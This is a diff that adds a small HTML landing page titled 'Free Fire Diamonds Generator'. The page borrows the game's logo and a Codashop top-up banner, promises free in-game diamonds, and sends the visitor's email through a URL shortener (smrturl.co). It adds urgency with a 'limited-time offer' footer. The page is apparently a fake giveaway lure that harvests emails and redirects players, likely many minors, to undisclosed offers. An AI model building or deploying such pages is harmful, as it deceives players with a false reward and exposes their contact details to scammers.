@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Free Fire Diamonds Generator</title>
+  <style>
+    body {
+      background-color: #121212;
+      color: white;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px 20px;
+    }
+    .container {
+      background-color: #1e1e1e;
+      border-radius: 10px;
+      padding: 30px;
+      max-width: 400px;
+      margin: auto;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+    }
+    img {
+      max-width: 100%;
+      border-radius: 10px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      color: #00e0ff;
+    }
+    p {
+      color: #ccc;
+    }
+    input[type="email"] {
+      width: 90%;
+      padding: 12px;
+      margin-top: 15px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    .cta-button {
+      margin-top: 15px;
+      background-color: #00e0ff;
+      color: black;
+      border: none;
+      padding: 15px 25px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      text-decoration: none;
+      display: inline-block;
+    }
+    .cta-button:hover {
+      background-color: #00b8cc;
+    }
+    .footer-note {
+      margin-top: 25px;
+      font-size: 14px;
+      color: #999;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://seeklogo.com/images/F/free-fire-logo-463B315D87-seeklogo.com.png" alt="Free Fire Logo">
+    <img src="https://cdn1.codashop.com/S/content/common/images/mno/ff_topup_banner_en.jpg" alt="Diamonds">
+    <h1>Get Free Diamonds!</h1>
+    <p>Enter your email to receive your Free Fire diamond rewards now!</p>
+    <form action="https://smrturl.co/155658d" method="get">
+      <input type="email" name="email" placeholder="Enter your email" required>
+      <br>
+      <button type="submit" class="cta-button">Get Diamonds</button>
+    </form>
+    <div class="footer-note">
+      *Limited-time offer. Valid emails only. Hurry before it's gone!
+    </div>
+  </div>
+</body>
+</html>
